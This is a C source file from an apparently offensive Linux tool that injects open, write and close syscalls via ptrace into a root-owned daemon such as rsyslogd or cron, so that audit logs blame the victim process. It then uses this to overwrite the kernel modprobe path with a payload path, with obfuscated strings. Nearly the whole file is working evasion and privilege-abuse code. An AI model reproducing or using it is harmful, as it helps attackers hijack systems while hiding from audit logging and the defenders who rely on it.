/*
 * Process injection via ptrace for attribution evasion.
 *
 * Injects syscalls (open/write/close) into a victim process so
 * the file operation is attributed to the victim's PID in audit
 * logs. The calling process only shows ptrace attach/detach.
 *
 * x86_64 only. Requires root.
 */

#include "nfttables.h"
#include "stealth.h"
#include "obf.h"
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <signal.h>

/* inject a single syscall into the stopped victim */
static long inject_syscall(pid_t victim, long nr,
                           long a1, long a2, long a3,
                           long a4, long a5, long a6)
{
    struct user_regs_struct orig, modified;

    if (ptrace(PTRACE_GETREGS, victim, 0, &orig) < 0)
        return -1;

    modified = orig;
    modified.rax = nr;
    modified.rdi = a1;
    modified.rsi = a2;
    modified.rdx = a3;
    modified.r10 = a4;
    modified.r8  = a5;
    modified.r9  = a6;

    /* save 8 bytes at RIP */
    long saved_word = ptrace(PTRACE_PEEKTEXT, victim, orig.rip, 0);

    /* write: syscall (0f 05) + int3 (cc) + nops */
    long trap_word = 0x9090909090cc050fUL;
    if (ptrace(PTRACE_POKETEXT, victim, orig.rip, trap_word) < 0)
        goto restore;

    if (ptrace(PTRACE_SETREGS, victim, 0, &modified) < 0)
        goto restore;

    if (ptrace(PTRACE_CONT, victim, 0, 0) < 0)
        goto restore;

    /* wait for SIGTRAP from int3 */
    int status;
    waitpid(victim, &status, 0);
    if (!WIFSTOPPED(status) || WSTOPSIG(status) != SIGTRAP)
        goto restore;

    /* read return value */
    struct user_regs_struct result;
    ptrace(PTRACE_GETREGS, victim, 0, &result);
    long ret = result.rax;

    /* restore original code and registers */
    ptrace(PTRACE_POKETEXT, victim, orig.rip, saved_word);
    ptrace(PTRACE_SETREGS, victim, 0, &orig);

    return ret;

restore:
    ptrace(PTRACE_POKETEXT, victim, orig.rip, saved_word);
    ptrace(PTRACE_SETREGS, victim, 0, &orig);
    return -1;
}

/* write a string to the victim's stack (below RSP) for use as a syscall arg */
static long push_string(pid_t victim, const char *str, int len)
{
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, victim, 0, &regs) < 0)
        return 0;

    /* write below the stack (in the red zone and beyond).
       aligned to 8 bytes for POKETEXT */
    long addr = regs.rsp - 256;
    addr &= ~7;

    for (int i = 0; i < len; i += sizeof(long)) {
        long word = 0;
        int chunk = (len - i < (int)sizeof(long)) ? (len - i) : (int)sizeof(long);
        memcpy(&word, str + i, chunk);
        if (ptrace(PTRACE_POKETEXT, victim, addr + i, word) < 0)
            return 0;
    }

    return addr;
}

int stealth_find_victim(void)
{
    /* look for a root-owned long-lived process.
       prefer something that normally does file I/O. */
    const char *preferred[] = {
        "systemd-journal", "rsyslogd", "syslogd",
        "crond", "cron", "atd",
        "agetty", "login",
        NULL
    };

    DIR *d = opendir("/proc");
    if (!d) return -1;

    int best_pid = -1;
    int best_score = -1;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] < '0' || ent->d_name[0] > '9')
            continue;

        int pid = atoi(ent->d_name);
        if (pid <= 2) continue;  /* skip idle, init, kthreadd */

        char path[64], buf[256];
        int uid = -1;

        /* check uid */
        snprintf(path, sizeof(path), "/proc/%d/status", pid);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        while (fgets(buf, sizeof(buf), f)) {
            if (strncmp(buf, "Uid:", 4) == 0) {
                uid = atoi(buf + 5);
                break;
            }
        }
        fclose(f);

        if (uid != 0) continue;  /* must be root */

        /* read comm */
        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
        f = fopen(path, "r");
        if (!f) continue;
        buf[0] = 0;
        if (fgets(buf, sizeof(buf), f))
            buf[strcspn(buf, "\n")] = 0;
        fclose(f);

        /* score: preferred name = 10, any root process = 1 */
        int score = 1;
        for (const char **p = preferred; *p; p++) {
            if (strcmp(buf, *p) == 0) {
                score = 10;
                break;
            }
        }

        if (score > best_score) {
            best_score = score;
            best_pid = pid;
        }
    }
    closedir(d);
    return best_pid;
}

int stealth_write_file(const char *path, const char *data, int len)
{
    pid_t victim = stealth_find_victim();
    if (victim < 0) return -1;

    pr_verb("ptrace injecting into PID %d", victim);

    if (ptrace(PTRACE_ATTACH, victim, 0, 0) < 0)
        return -1;

    int status;
    waitpid(victim, &status, 0);
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, victim, 0, 0);
        return -1;
    }

    int ret = -1;

    /* push the file path string onto the victim's stack */
    long path_addr = push_string(victim, path, strlen(path) + 1);
    if (!path_addr) goto detach;

    /* push the data to write */
    long data_addr = push_string(victim, data, len);
    if (!data_addr) goto detach;

    /* inject: fd = open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644) */
    long fd = inject_syscall(victim, __NR_open,
                             path_addr,
                             O_WRONLY | O_CREAT | O_TRUNC,
                             0644, 0, 0, 0);
    if (fd < 0) {
        pr_verb("injected open() failed: %ld", fd);
        goto detach;
    }

    /* inject: write(fd, data, len) */
    long written = inject_syscall(victim, __NR_write,
                                  fd, data_addr, len, 0, 0, 0);
    if (written != len) {
        pr_verb("injected write() returned %ld (expected %d)", written, len);
    }

    /* inject: close(fd) */
    inject_syscall(victim, __NR_close, fd, 0, 0, 0, 0, 0);
    ret = 0;

detach:
    ptrace(PTRACE_DETACH, victim, 0, 0);
    return ret;
}

int stealth_write_modprobe(const char *payload_path)
{
    return stealth_write_file(S(S_PROC_MODPROBE),
                              payload_path,
                              strlen(payload_path));
}
